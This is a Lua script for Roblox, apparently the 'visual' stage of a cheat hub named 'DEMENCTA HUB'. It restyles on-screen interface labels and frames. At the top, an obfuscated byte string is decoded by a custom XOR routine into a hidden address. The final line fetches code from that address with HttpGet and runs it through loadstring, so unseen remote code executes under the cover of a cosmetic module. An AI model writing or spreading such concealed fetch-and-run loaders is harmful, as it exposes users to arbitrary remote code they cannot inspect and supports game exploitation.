
--[[ STAGE 2: VISUAL CORE ]]
local ia9qlg9XjmqxsFQI="\045\067\044\112\053\140\061\130\063\143\149\139\051\075\075\092\097\077\067\065\164\148\173\152\178\116\079\100\121\062\087\111\127\106\133\098\099\179\103\141\130\132\121\148\137\126\123\121\127\132\127\165\166\155\170\159\160\176\181\127\147\171\187\171\177\170\181\164\163\205\189\152\251\188\185\195\193\005\196\198\205\229\203\213\205\232\218\025\224\241\222\227\225\235\229\235\234\237\238\049\241\245\251\056\016\252\005\022\002\005\011\028\017\033\037\020\041\014\044\019\035\092\055\035\054\101\103\116\063\062\068\070\044"local sxY7eMw9NpX_IZn6kv2buY=200 local JaiI_SR_bHuXgiSsjkGUo9=130 local rUyettgW7jui=0 local ihrGwZ92BpWJZceMIszHBL=2 local EWoAPWrJIHSHJwHS=0 local GwktJMcu4oJdbZzKYTsg8=true local PbFKILY8m_I65R7SEr7=bit32 and bit32.bxor if not PbFKILY8m_I65R7SEr7 then PbFKILY8m_I65R7SEr7=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local CbyXAXxgym0Okfn={}for UeB6nw1GfnkswSArJLXt=1,#ia9qlg9XjmqxsFQI do local pAAXhaoyMR17BzZUH=string.byte(ia9qlg9XjmqxsFQI,UeB6nw1GfnkswSArJLXt)local ZeBVtp6pqwSYRL5cpg7=(JaiI_SR_bHuXgiSsjkGUo9+(UeB6nw1GfnkswSArJLXt*ihrGwZ92BpWJZceMIszHBL)+EWoAPWrJIHSHJwHS)%256 if rUyettgW7jui==0 then pAAXhaoyMR17BzZUH=(pAAXhaoyMR17BzZUH-ZeBVtp6pqwSYRL5cpg7)%256 CbyXAXxgym0Okfn[UeB6nw1GfnkswSArJLXt]=string.char(PbFKILY8m_I65R7SEr7(pAAXhaoyMR17BzZUH,sxY7eMw9NpX_IZn6kv2buY))else pAAXhaoyMR17BzZUH=PbFKILY8m_I65R7SEr7(pAAXhaoyMR17BzZUH,sxY7eMw9NpX_IZn6kv2buY)CbyXAXxgym0Okfn[UeB6nw1GfnkswSArJLXt]=string.char((pAAXhaoyMR17BzZUH-ZeBVtp6pqwSYRL5cpg7)%256)end end local ijp0kc6z8IpIcQ=table.concat(CbyXAXxgym0Okfn)if GwktJMcu4oJdbZzKYTsg8 then ijp0kc6z8IpIcQ=string.reverse(ijp0kc6z8IpIcQ)end local jIe9oOL32TGt4N_3GF=ijp0kc6z8IpIcQ
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(jIe9oOL32TGt4N_3GF))()
